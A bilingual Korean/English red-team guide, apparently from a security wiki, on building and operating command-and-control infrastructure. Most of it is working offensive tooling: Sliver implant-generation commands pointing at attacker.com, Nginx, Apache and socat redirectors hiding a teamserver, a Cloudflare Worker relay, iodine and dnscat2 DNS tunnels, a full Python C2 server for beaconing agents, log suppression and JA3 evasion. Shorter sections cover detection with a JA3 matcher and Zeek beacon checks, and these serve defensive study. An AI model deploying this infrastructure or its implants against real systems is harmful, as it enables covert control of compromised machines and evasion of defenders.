> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# C2(Command and Control) 인프라 구축 및 운영

## 0. 초보자를 위한 개념 이해

### C2(Command and Control)란?

**C2(C&C, Command and Control)**는 공격자가 침해된 시스템(에이전트)을 원격으로 제어하는 통신 채널입니다.

```
악성코드 없는 경우:
  공격자 → 직접 SSH로 접속 → 서버 제어
  문제: SSH 연결이 방화벽/IDS에 탐지됨
  
C2 사용:
  공격자 → C2 서버 → 에이전트(임플란트) → 피해 시스템
  장점: 직접 연결이 없어서 탐지 어려움
        에이전트가 HTTP/HTTPS처럼 보이는 트래픽 사용
```

**비유:** 
- 직접 접속 = 공범에게 직접 전화 (통화 내역 남음)
- C2 = 중계인을 통한 암호화 메시지 (추적 어려움)

### 레드팀에서 C2가 필요한 이유

```
모의해킹(침투 테스트):
  방어팀이 실제 공격을 얼마나 탐지하는지 테스트
  → 실제 공격자와 같은 C2 기법 사용해야 현실적인 테스트 가능
  
  실제 APT 그룹들이 사용하는 C2:
  - Lazarus Group: HTTP over custom protocol
  - APT28: HTTPS with certificate pinning
  - Cobalt Strike: 상용 C2 (많은 레드팀에서 사용)
```

> ⚠️ **이 내용은 허가된 레드팀 작전, CTF, 보안 연구 목적으로만 사용하세요.**

### 주요 C2 프레임워크 비교

| 프레임워크 | 유형 | 특징 |
|-----------|------|------|
| **Cobalt Strike** | 상용 ($3500) | 가장 널리 사용, 기능 풍부 |
| **Metasploit** | 오픈소스 (무료) | 교육용, 초보자 친화적 |
| **Sliver** | 오픈소스 (무료) | Cobalt Strike 대안, mTLS 지원 |
| **Havoc** | 오픈소스 (무료) | 최신 기법, 활발한 개발 |
| **Empire** | 오픈소스 (무료) | PowerShell/Python 기반 |

---

## 개요

C2(C&C) 인프라는 레드팀 작전에서 에이전트(임플란트)를 제어하는 핵심 구성요소다. 탐지를 피하면서 안정적인 통신 채널을 유지하는 것이 핵심 과제다.

---

## C2 아키텍처 구성요소

```
레드팀 운영자
     │
     ▼
[팀서버 / C2 서버]  ← 실제 C2 로직 처리
     │
     ▼
[리다이렉터/프록시]  ← IP 숨김, 트래픽 필터링
     │
  인터넷
     │
     ▼
[에이전트/임플란트]  ← 침해된 시스템에서 실행
```

### 구성요소 역할

| 컴포넌트 | 역할 | 예시 |
|----------|------|------|
| 팀서버 | C2 명령 처리, 에이전트 관리 | Cobalt Strike, Havoc, Sliver |
| 리다이렉터 | 팀서버 IP 보호, 트래픽 포워딩 | Nginx, socat, Apache mod_rewrite |
| 에이전트 | 피해 시스템에서 실행, 비콘 | Beacon, Implant, RAT |
| CDN | 합법적 인프라 경유로 탐지 우회 | Cloudflare, AWS CloudFront |

---

## 오픈소스 C2 프레임워크

### Havoc Framework

```bash
# 서버 설치
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Docker로 실행
docker-compose up -d

# 팀서버 시작
./havoc server --profile ./profiles/havoc.yaotl -v --debug

# 클라이언트 접속
./havoc client
```

### Sliver Framework

```bash
# 설치
curl https://sliver.sh/install | sudo bash

# 서버 시작
sliver-server

# 리스너 생성 (HTTP/HTTPS/DNS/MTLS)
sliver > https --lhost 0.0.0.0 --lport 443

# 임플란트 생성
sliver > generate --http https://C2_DOMAIN --os windows --arch amd64 \
  --save /tmp/implant.exe

# 세션 관리
sliver > sessions
sliver > use SESSION_ID
sliver [session] > whoami
sliver [session] > ps
sliver [session] > upload /local/file /remote/path
```

---

## 리다이렉터 구성

### Nginx 리다이렉터

```nginx
# /etc/nginx/sites-available/c2_redirector

server {
    listen 443 ssl;
    server_name legitimate-looking-domain.com;

    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;

    # 특정 User-Agent/URI만 팀서버로 포워딩
    # 나머지는 합법적인 사이트로 리다이렉트
    location /api/v2/telemetry {
        # C2 비콘 경로 - 팀서버로 포워딩
        proxy_pass https://TEAMSERVER_IP:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location / {
        # 나머지 트래픽은 합법적 사이트로 리다이렉트
        return 302 https://www.microsoft.com/;
    }
}
```

### Apache mod_rewrite 리다이렉터

```apache
# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /etc/ssl/cert.pem
    SSLCertificateKeyFile /etc/ssl/key.pem

    RewriteEngine On

    # 에이전트 User-Agent만 포워딩
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*Windows NT 10.0.*rv:91.0"
    RewriteRule ^(.*)$ https://TEAMSERVER_IP:8443/$1 [P,L]

    # 나머지는 404
    RewriteRule ^(.*)$ - [F]
</VirtualHost>
```

### socat 간단 포워딩

```bash
# TCP 리다이렉터
socat TCP4-LISTEN:80,fork TCP4:TEAMSERVER_IP:80 &

# TLS 리다이렉터
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork \
  TCP4:TEAMSERVER_IP:8443 &
```

---

## 도메인 프론팅 개념

```
에이전트 → HTTPS → CDN (신뢰받는 도메인) → 팀서버
              Host: cdn.cloudflare.com     (SNI)
              Host: c2.attacker.com        (HTTP Host 헤더)
```

현재 대부분의 CDN이 차단했으나, 개념은 중요하다.

---

## DNS over HTTPS(DoH) C2

```python
#!/usr/bin/env python3
"""
DNS C2 개념 데모 - DNS TXT 레코드를 통한 명령 전달
(교육 목적)
"""

import base64
import dns.resolver


def send_command_via_dns(command: str, domain: str) -> None:
    encoded = base64.b64encode(command.encode()).decode()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    print(f"DNS TXT 레코드로 전송할 청크: {len(chunks)}개")
    for i, chunk in enumerate(chunks):
        print(f"  {i}.{domain} → TXT: {chunk}")


def receive_command_via_dns(domain: str) -> str | None:
    try:
        resolver = dns.resolver.Resolver()
        answers = resolver.resolve(domain, "TXT")
        combined = "".join(
            rdata.strings[0].decode()
            for rdata in answers
        )
        return base64.b64decode(combined).decode()
    except Exception:
        return None
```

---

## Python 미니 C2 서버 구현

```python
#!/usr/bin/env python3
"""
Mini C2 Server - HTTP 기반 에이전트 제어 (교육/연구 목적)
사용법: python3 mini_c2.py --host 0.0.0.0 --port 8080
"""

import argparse
import base64
import hashlib
import http.server
import json
import os
import queue
import sys
import threading
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs


@dataclass
class Agent:
    agent_id: str
    hostname: str
    username: str
    os_info: str
    last_seen: float = field(default_factory=time.time)
    command_queue: queue.Queue = field(default_factory=queue.Queue)
    results: list[dict] = field(default_factory=list)


# 전역 에이전트 저장소
agents: dict[str, Agent] = {}
agents_lock = threading.Lock()

# 간단한 API 키 (실전에서는 더 강력한 인증 필요)
API_KEY = hashlib.sha256(os.urandom(32)).hexdigest()[:32]


class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format: str, *args) -> None:
        pass  # 기본 로그 비활성화

    def _send_json(self, data: dict, status: int = 200) -> None:
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self) -> dict | None:
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length == 0:
            return None
        body = self.rfile.read(content_length)
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            return None

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/register":
            self._handle_register()
        elif path == "/beacon":
            self._handle_beacon()
        elif path == "/result":
            self._handle_result()
        elif path == "/cmd":
            self._handle_cmd()
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_register(self) -> None:
        data = self._read_json()
        if not data:
            self._send_json({"error": "invalid"}, 400)
            return

        agent_id = hashlib.md5(
            (data.get("hostname", "") + data.get("username", "")).encode()
        ).hexdigest()[:8]

        with agents_lock:
            agent = Agent(
                agent_id=agent_id,
                hostname=data.get("hostname", "unknown"),
                username=data.get("username", "unknown"),
                os_info=data.get("os", "unknown"),
            )
            agents[agent_id] = agent

        print(f"[+] 새 에이전트 등록: {agent_id} ({agent.username}@{agent.hostname})")
        self._send_json({"agent_id": agent_id})

    def _handle_beacon(self) -> None:
        data = self._read_json()
        if not data:
            self._send_json({})
            return

        agent_id = data.get("agent_id", "")
        with agents_lock:
            agent = agents.get(agent_id)
            if not agent:
                self._send_json({"error": "unknown"}, 401)
                return

            agent.last_seen = time.time()

            try:
                command = agent.command_queue.get_nowait()
                self._send_json({"command": command})
                print(f"[→] {agent_id}: 명령 전달 — {command[:50]}")
            except queue.Empty:
                self._send_json({})

    def _handle_result(self) -> None:
        data = self._read_json()
        if not data:
            self._send_json({})
            return

        agent_id = data.get("agent_id", "")
        result = data.get("result", "")

        with agents_lock:
            agent = agents.get(agent_id)
            if agent:
                decoded = base64.b64decode(result).decode(errors="replace")
                agent.results.append({"time": time.time(), "output": decoded})
                print(f"[←] {agent_id}: 결과 수신 ({len(decoded)} bytes)")
                print(f"    {decoded[:200]}")

        self._send_json({"status": "ok"})

    def _handle_cmd(self) -> None:
        # 운영자 인터페이스 (실전에서는 인증 필수)
        data = self._read_json()
        if not data:
            self._send_json({"error": "invalid"}, 400)
            return

        if data.get("api_key") != API_KEY:
            self._send_json({"error": "unauthorized"}, 401)
            return

        agent_id = data.get("agent_id")
        command = data.get("command")

        with agents_lock:
            agent = agents.get(agent_id)
            if not agent:
                self._send_json({"error": "agent not found"}, 404)
                return

            agent.command_queue.put(command)

        self._send_json({"status": "queued"})


def operator_cli(server_url: str) -> None:
    import urllib.request
    print(f"[*] C2 운영자 CLI 시작 (API Key: {API_KEY})")
    print("[*] 명령어: list | cmd <id> <command> | quit")

    while True:
        try:
            line = input("C2> ").strip()
            if not line:
                continue
            if line == "quit":
                break
            elif line == "list":
                with agents_lock:
                    for aid, agent in agents.items():
                        age = int(time.time() - agent.last_seen)
                        print(f"  [{aid}] {agent.username}@{agent.hostname} ({age}s ago)")
            elif line.startswith("cmd "):
                parts = line.split(" ", 2)
                if len(parts) < 3:
                    print("사용법: cmd <agent_id> <command>")
                    continue
                _, agent_id, command = parts
                payload = json.dumps({
                    "api_key": API_KEY,
                    "agent_id": agent_id,
                    "command": command,
                }).encode()
                req = urllib.request.Request(
                    f"{server_url}/cmd",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                with urllib.request.urlopen(req) as resp:
                    print(json.loads(resp.read()))
        except (KeyboardInterrupt, EOFError):
            break


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Mini C2 Server (교육/연구 목적)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--host", default="0.0.0.0", help="바인딩 호스트")
    parser.add_argument("--port", type=int, default=8080, help="포트")

    args = parser.parse_args()

    server = http.server.ThreadingHTTPServer((args.host, args.port), C2Handler)
    print(f"[*] C2 서버 시작: http://{args.host}:{args.port}")
    print(f"[*] API Key: {API_KEY}")

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    operator_cli(f"http://127.0.0.1:{args.port}")
    server.shutdown()


if __name__ == "__main__":
    main()
```

---

## OPSEC 고려사항

### 인프라 격리

```
- 공격팀 실제 IP → 절대 노출 금지
- 각 작전마다 독립적인 도메인/IP 사용
- 도메인 에이징: 최소 30일 이상 된 도메인 사용
- 합법적 카테고리로 도메인 분류(IT, 기술 관련)
```

### 트래픽 위장

```
- 비콘 간격에 지터(jitter) 추가 (고정 패턴 탐지 방지)
- HTTPS 사용, 합법적 서비스 트래픽과 유사한 User-Agent
- 전송 크기 패딩
- 업무 시간에만 통신 (9-18시)
```

### 로그 최소화

```bash
# nginx 로그 비활성화
access_log off;
error_log /dev/null crit;

# iptables로 C2 서버 직접 접근 차단
iptables -A INPUT -p tcp --dport 8443 \
  ! -s REDIRECTOR_IP -j DROP
```

---

## JA3/JA4 TLS 핑거프린팅 회피와 탐지

Cobalt Strike·Sliver 같은 C2 프레임워크의 기본 TLS 스택은 특유의 암호 스위트 순서·확장 목록을 갖고 있어, TLS ClientHello만으로 계산하는 **JA3(구) / JA4(신)** 해시로 정상 브라우저 트래픽과 구분된다. Malleable C2 프로파일은 이 핑거프린트를 크롬·파이어폭스와 동일하게 위장해 네트워크 탐지를 회피하는 데 쓰인다.

```
# 기본 Cobalt Strike 빈은 널리 알려진 JA3 해시를 남긴다 (예시)
JA3: 72a589da586844d7f0818ce684948eea  →  "Cobalt Strike default beacon" 로 다수 위협 인텔 DB에 등재됨

# Malleable C2 프로파일에서 TLS 스택을 브라우저와 맞추는 설정 예
https-certificate {
    set C2Server "0.0.0.0,";
}
http-config {
    set headers "Date, Server, Content-Type";
    header "Server" "nginx";
}
# 실제 JA3/JA4 값은 프로파일이 아니라 C2 프레임워크의 TLS 라이브러리/암호 스위트
# 순서에서 결정되므로, 별도 리버스 프록시(nginx+mod_tls) 뒤에서 TLS 종단을 위장하기도 한다.
```

```python
#!/usr/bin/env python3
"""Zeek/Suricata JA3 로그에서 알려진 C2 프레임워크 핑거프린트 매칭."""
import json
from pathlib import Path

KNOWN_C2_JA3 = {
    "72a589da586844d7f0818ce684948eea": "Cobalt Strike (default)",
    "e7d705a3286e19ea42f587b344ee6865": "Metasploit (default)",
}


def scan_zeek_ssl_log(path: Path) -> None:
    for line in path.read_text().splitlines():
        if line.startswith("#"):
            continue
        fields = line.split("\t")
        ja3 = fields[-1] if fields else ""
        if ja3 in KNOWN_C2_JA3:
            print(f"[!] 알려진 C2 JA3 탐지: {KNOWN_C2_JA3[ja3]} ({ja3})")


if __name__ == "__main__":
    scan_zeek_ssl_log(Path("ssl.log"))
```

**탐지/방어**: 알려진 JA3/JA4 해시 블랙리스트는 프로파일 변조 한 번으로 우회되므로 단독 탐지 근거로 쓰지 말고, **JA3S(서버 응답 핑거프린트)와 SNI·인증서 발급자·비콘 주기성**을 함께 상관분석해야 한다. 위협 인텔 피드(예: abuse.ch JA3 목록)를 정기 갱신하고, 알려진 정상 브라우저 JA4 목록과의 화이트리스트 비교로 미확인 핑거프린트를 우선순위 검토 대상으로 표시하는 것이 실전에서 더 견고하다.

---

<!-- detect-validate-17 -->
## C2 탐지와 방어 검증

C2 인프라는 *어떻게 은밀히 명령·제어하는가*를 다루지만, 방어자는 **비콘이 네트워크 플로우·TLS 핑거프린트·DNS 어디에 흔적을 남기는가**와 **이그레스 통제·탐지가 실제로 잡는가**를 검증해야 한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 계층 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| HTTP(S) 비콘 | 아웃바운드 웹 | 이그레스 프록시, TLS 검사 | 균일 간격 연결, 비정상 UA/JA3 |
| DNS 터널/비콘 | 이름해석 | DNS 모니터링, RPZ | 고엔트로피 서브도메인, TXT 급증 |
| 도메인 프론팅 | CDN 신뢰 | SNI 검사, 정책 | SNI-Host 불일치 |
| 말리블 프로파일 | 시그니처 회피 | 행위/주기성 분석 | 지터에도 남는 주기성 |

### 방어 검증 (직접 확인)

```bash
# C2 비콘(균일 간격 아웃바운드)이 탐지되는지 검증 — 소유/통제 캡처를 Zeek 으로 분석
zeek -r traffic.pcap 2>/dev/null && ls conn.log ssl.log 2>/dev/null
# 동일 목적지로의 연결 간격이 거의 일정하면 비콘 의심(지터 포함)
awk '{print $3, $5}' conn.log 2>/dev/null | sort | uniq -c | sort -rn | head
# ssl.log 의 JA3 해시를 알려진 C2 프로파일과 대조
```

> 검증은 **승인된 교전·소유/통제 네트워크**에서만(RoE 준수). "이그레스 필터 설정"과 "비콘을 실제 차단·탐지한다"는 다르다 — 통제 환경에서 비콘을 재생해 주기성·JA3 가 탐지되는지 확인한다([[49_Red_Team_Infrastructure]], [[72_Malware_Sandbox_Analysis]]).

---

<a name="english"></a>

# C2 (Command and Control) Infrastructure Setup and Operations

## Overview

C2 (C&C) infrastructure is the core component that controls agents (implants) in red team operations. Maintaining reliable communication channels while evading detection is the key challenge.

```
C2 Architecture:

Operator ──► C2 Server ──► Redirector ──► Target Network
                               │
                        (VPS/CDN/Domain Fronting)
                        Hides real C2 server IP
```

---

## 1. C2 Framework Comparison

| Framework | Language | Protocol | Features | Use Case |
|-----------|---------|---------|---------|---------|
| Cobalt Strike | Java | HTTP/S, DNS, SMB | Commercial, mature | Enterprise red team |
| Sliver | Go | mTLS, WireGuard, DNS | Open source, modern | General red team |
| Havoc | C/C++ | HTTP/S, SMB | Modern, evasive | Advanced operations |
| Metasploit | Ruby | Various | Open source | CTF, basic ops |
| Covenant | C# | HTTP/S | .NET based | Windows-focused |

---

## 2. Sliver C2 Setup

```bash
# Sliver installation
curl https://sliver.sh/install | sudo bash

# Start server
sliver-server

# Generate implant
sliver > generate --mtls attacker.com:8888 --os windows --arch amd64 \
                  --format exe --save /tmp/implant.exe

# HTTPS implant (more evasive)
sliver > generate --https attacker.com:443 --os windows \
                  --skip-symbols --format shellcode --save /tmp/shellcode.bin

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Interact with session after implant executes
sliver > sessions
sliver > use SESSION_ID
sliver (implant) > whoami
sliver (implant) > shell
```

---

## 3. Domain Fronting

```
Domain fronting uses CDN infrastructure to hide the real C2 server:

Browser ──► CDN (Cloudflare/Fastly) ──► C2 Server

HTTP Request:
  Host: legitimate-site.com        ← CDN routing
  X-Forwarded-Host: attacker.com   ← Actual C2 destination

Why it works:
  - TLS is terminated at CDN edge
  - Network monitoring sees CDN traffic, not C2
  - CDN IP is whitelisted in most firewalls
```

```bash
# Domain fronting with Cloudflare Workers
# 1. Create Cloudflare Worker
# 2. Worker forwards traffic to real C2 server
# 3. Implant connects to [worker].workers.dev (legitimate Cloudflare domain)

# Worker code (JavaScript):
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  url.hostname = 'real-c2-server.com'  // Real C2 server
  return fetch(url.toString(), request)
}
```

---

## 4. DNS C2

```bash
# DNS C2 using iodine
# Tunnels traffic through DNS queries

# Server side
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# Client side (implant)
iodine -f -P password tunnel.yourdomain.com

# DNScat2 — DNS tunneling
# Server
ruby dnscat2.rb --dns "domain=tunnel.example.com,host=0.0.0.0" --no-cache

# Client
./dnscat --dns server=ns1.example.com,port=53 --secret=password
```

---

## 5. OPSEC (Operational Security)

```bash
# Redirector setup (nginx)
# Hide real C2 server behind nginx redirector

server {
    listen 443 ssl;
    server_name cdn-legitimate.com;
    
    ssl_certificate /etc/ssl/legitimate.crt;
    ssl_certificate_key /etc/ssl/legitimate.key;
    
    # Only forward C2 traffic based on User-Agent
    if ($http_user_agent ~* "Mozilla/5.0 Windows NT 10.0; rv:68.0") {
        proxy_pass https://real-c2-server:8443;
    }
    
    # Serve decoy site for other traffic
    location / {
        root /var/www/decoy;
    }
}

# Disable nginx access logs
access_log off;
error_log /dev/null crit;

# Block direct access to C2 server via iptables
iptables -A INPUT -p tcp --dport 8443 \
  ! -s REDIRECTOR_IP -j DROP
```

---

## JA3/JA4 TLS Fingerprinting Evasion and Detection

C2 frameworks like Cobalt Strike and Sliver ship with a default TLS stack whose distinctive cipher-suite order and extension list stands out from real browser traffic in a **JA3 (legacy) / JA4 (current)** hash computed from nothing more than the TLS ClientHello. Malleable C2 profiles are used to make this fingerprint mimic Chrome or Firefox exactly, in order to evade network-level detection.

```
# The stock Cobalt Strike beacon leaves a well-known JA3 hash (example)
JA3: 72a589da586844d7f0818ce684948eea  ->  listed in many threat-intel feeds as "Cobalt Strike default beacon"

# Example Malleable C2 profile setting aimed at matching a browser's TLS stack
https-certificate {
    set C2Server "0.0.0.0,";
}
http-config {
    set headers "Date, Server, Content-Type";
    header "Server" "nginx";
}
# The actual JA3/JA4 value is determined by the C2 framework's TLS library and
# cipher-suite ordering, not the profile file, so operators sometimes terminate
# TLS behind a separate reverse proxy (nginx+mod_tls) to disguise it instead.
```

```python
#!/usr/bin/env python3
"""Match known C2-framework fingerprints against a Zeek/Suricata JA3 log."""
import json
from pathlib import Path

KNOWN_C2_JA3 = {
    "72a589da586844d7f0818ce684948eea": "Cobalt Strike (default)",
    "e7d705a3286e19ea42f587b344ee6865": "Metasploit (default)",
}


def scan_zeek_ssl_log(path: Path) -> None:
    for line in path.read_text().splitlines():
        if line.startswith("#"):
            continue
        fields = line.split("\t")
        ja3 = fields[-1] if fields else ""
        if ja3 in KNOWN_C2_JA3:
            print(f"[!] Known C2 JA3 detected: {KNOWN_C2_JA3[ja3]} ({ja3})")


if __name__ == "__main__":
    scan_zeek_ssl_log(Path("ssl.log"))
```

**Detection/Defense**: a blocklist of known JA3/JA4 hashes is defeated the moment the profile changes, so don't rely on it alone — correlate it with the **JA3S (server-response fingerprint), SNI, certificate issuer, and beacon periodicity** together. Refresh threat-intel feeds (e.g., abuse.ch's JA3 list) regularly, and treat any fingerprint absent from a whitelist of known-good browser JA4 values as a priority-review candidate; that combination holds up far better in practice than blocklisting alone.

---

<!-- detect-validate-17 -->
## C2 Detection and Defense Validation

C2 infrastructure describes *how to covertly command and control*, but defenders must verify **where beacons leave traces (network flow, TLS fingerprint, DNS)** and **whether egress controls and detection actually catch them**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Technique | Targeted layer | Primary control (defender) | Detection signal |
|---|---|---|---|
| HTTP(S) beacon | Outbound web | Egress proxy, TLS inspection | Uniform-interval connects, abnormal UA/JA3 |
| DNS tunnel/beacon | Resolution | DNS monitoring, RPZ | High-entropy subdomains, TXT spikes |
| Domain fronting | CDN trust | SNI inspection, policy | SNI-Host mismatch |
| Malleable profile | Signature evasion | Behavior/periodicity analysis | Periodicity surviving jitter |

### Defense validation (verify directly)

```bash
# Verify C2 beacons (uniform-interval outbound) are detectable — analyze an owned/controlled capture with Zeek
zeek -r traffic.pcap 2>/dev/null && ls conn.log ssl.log 2>/dev/null
# Near-constant connect intervals to the same destination suggest a beacon (even with jitter)
awk '{print $3, $5}' conn.log 2>/dev/null | sort | uniq -c | sort -rn | head
# Compare JA3 hashes in ssl.log against known C2 profiles
```

> Validate only on **authorized engagements / owned/controlled networks** (follow RoE). "Configured egress filter" differs from "actually blocks/detects beacons" — replay a beacon in a controlled environment to confirm periodicity/JA3 detection ([[49_Red_Team_Infrastructure]], [[72_Malware_Sandbox_Analysis]]).
